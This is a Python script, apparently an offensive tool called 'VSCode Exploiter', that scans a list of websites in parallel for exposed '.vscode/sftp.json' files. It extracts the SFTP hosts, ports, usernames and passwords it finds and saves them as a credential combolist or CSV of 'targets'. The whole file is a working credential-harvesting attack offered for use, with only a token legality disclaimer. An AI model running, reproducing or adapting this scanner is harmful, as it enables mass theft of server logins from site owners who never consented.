import json
import urllib3
import requests
import argparse
from tqdm import tqdm
from rich.console import Console
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()
parser = argparse.ArgumentParser()
parser.add_argument("input_file", help="Input file containing URLs to parse")
parser.add_argument("output_file", help="Output file to save parsed information")
parser.add_argument("-f", "--file_format", default="combolist", help="Output file format (combolist or csv)")
args = parser.parse_args()


banner = """

                ╦  ╦╔═╗╔═╗╔═╗╔╦╗╔═╗
                ╚╗╔╝╚═╗║  ║ ║ ║║║╣
                 ╚╝ ╚═╝╚═╝╚═╝═╩╝╚═╝
             ╔═╗═╗ ╦╔═╗╦  ╔═╗╦╔╦╗╔═╗╦═╗
             ║╣ ╔╩╦╝╠═╝║  ║ ║║ ║ ║╣ ╠╦╝
             ╚═╝╩ ╚═╩  ╩═╝╚═╝╩ ╩ ╚═╝╩╚═
                     Chocapikk
               (github.com/Chocapikk)
                Stay safe,stay legal
"""

console.print(f"[bold magenta]{banner}")
urls = []
with open(args.input_file, "r") as input_file:
    for line in input_file:
        line = line.strip()
        if not line.endswith('/.vscode/sftp.json'):
            line += "/.vscode/sftp.json"
        urls.append(line)

success_count = 0
progress_bar = tqdm(total=len(urls), unit=' URL', bar_format='\033[32m{l_bar}{bar}| {n_fmt}/{total_fmt} [Elapsed: {elapsed}, Remaining: {remaining} {rate_fmt}]\033')


output_list = []
if args.file_format == "csv":
    output_list.append("url, name, host, protocol, port, username, remotePath, password, uploadOnSave")

def extract_info(json_response):
    try:
        json_data = json.loads(json_response)
        name = json_data.get("name", "NULL")
        host = json_data.get("host", "NULL")
        protocol = json_data.get("protocol", "NULL")
        port = json_data.get("port", "NULL")
        username = json_data.get("username", "NULL")
        remotePath = json_data.get("remotePath", "NULL")
        password = json_data.get("password", "NULL")
        uploadOnSave = json_data.get("uploadOnSave", "NULL")
        return name, host, protocol, port, username, remotePath, password, uploadOnSave
    except:
        pass

with ThreadPoolExecutor(100) as executor:
        future_to_url = {executor.submit(requests.get, url, verify=False, timeout=2): url for url in urls}
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                response = future.result()
                if response.status_code != 200:
                    pass
                json_response = response.text
                name, host, protocol, port, username, remotePath, password, uploadOnSave = extract_info(json_response)
                if args.file_format == "combolist":
                    line = f"{host}:{port} {username}:{password} {protocol}:{url}"
                elif args.file_format == "csv":
                    line  = f"{name}, {host}, {protocol}, {port}, {username}, {remotePath}, {password}, {uploadOnSave}, {url}"
                output_list.append(line)
                if line in output_list:
                    success_count += 1
            except requests.exceptions.RequestException:
                pass
            except TypeError:
                pass
            progress_bar.set_description(f"Successful: {success_count}")
            progress_bar.update()
        progress_bar.close()
        output_list = list(OrderedDict.fromkeys(output_list))
        with open(args.output_file, "w") as output_file:
            for item in output_list:
                output_file.write(item + "\n")
        console.print('\n' + f"[bold green][✔️] File {args.output_file} has been saved with {len(output_list)} targets")
